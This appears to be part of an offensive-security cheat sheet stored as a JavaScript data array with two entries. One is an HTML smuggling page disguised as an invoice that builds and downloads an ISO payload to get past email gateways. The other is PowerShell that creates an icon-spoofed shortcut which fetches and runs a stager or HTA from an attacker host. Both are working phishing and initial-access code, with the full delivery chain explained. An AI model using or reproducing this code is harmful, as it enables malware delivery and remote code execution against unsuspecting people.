{t:"HTML smuggling payload",l:"html",c:"<!-- HTML Smuggling: assembles and downloads payload client-side -->\n<!-- Email attachment: invoice.html -->\n<html>\n<head><title>Loading document...</title></head>\n<body>\n<h2>Loading your document, please wait...</h2>\n<p>If download doesn't start, <a id=\"dl\" href=\"#\">click here</a>.</p>\n\n\x3cscript\x3e\n// Base64-encoded payload (ISO, ZIP, or MSI)\nvar payload = \"BASE64_ENCODED_PAYLOAD_HERE\";\n\n// Decode base64 to binary\nvar raw = atob(payload);\nvar bytes = new Uint8Array(raw.length);\nfor (var i = 0; i < raw.length; i++) {\n    bytes[i] = raw.charCodeAt(i);\n}\n\n// Create blob and trigger download\nvar blob = new Blob([bytes], {type: 'application/octet-stream'});\nvar url = window.URL.createObjectURL(blob);\n\nvar a = document.createElement('a');\na.href = url;\na.download = 'Invoice_Q3_2024.iso';  // or .zip\na.click();\n\n// Cleanup\nwindow.URL.revokeObjectURL(url);\n\n// Fallback link\ndocument.getElementById('dl').href = url;\ndocument.getElementById('dl').download = 'Invoice_Q3_2024.iso';\n\x3c/script\x3e\n\n<!-- Why this works: -->\n<!-- Email gateway scans the HTML file: sees no embedded executable -->\n<!-- Payload is base64 text, assembled by JavaScript in victim's browser -->\n<!-- File never traverses the email gateway as an executable -->\n<!-- Browser downloads the assembled file to disk -->\n</body>\n</html>"},
{t:"LNK payload creation (PowerShell)",l:"ps",c:"# Create malicious LNK (shortcut) file\n# LNK executes PowerShell via mshta or directly\n\n# Method 1: PowerShell LNK creation\n$wsh = New-Object -ComObject WScript.Shell\n$lnk = $wsh.CreateShortcut(\"$env:TEMP\\Document.lnk\")\n$lnk.TargetPath = \"C:\\Windows\\System32\\mshta.exe\"\n$lnk.Arguments = \"http://ATTACKER_IP/payload.hta\"\n$lnk.IconLocation = \"C:\\Windows\\System32\\shell32.dll,1\"  # Word doc icon\n$lnk.Description = \"Q3 Financial Report\"\n$lnk.Save()\n\n# Method 2: Direct PowerShell in LNK\n$lnk.TargetPath = \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"\n$lnk.Arguments = \"-w hidden -ep bypass -c `\"IEX(IWR http://ATTACKER_IP/stager.ps1)`\"\"\n$lnk.IconLocation = \"C:\\Windows\\System32\\shell32.dll,1\"\n$lnk.Save()\n\n# Package in ISO:\n# Use oscdimg (Windows ADK) or mkisofs:\n# oscdimg -o -h -u2 C:\\staging\\ C:\\output\\Invoice.iso\n# ISO contains: Document.lnk + decoy.pdf\n\n# Full chain:\n# Email -> HTML smuggling -> downloads ISO\n# User mounts ISO -> sees LNK (looks like document)\n# Double-click LNK -> mshta/PowerShell -> payload execution"}
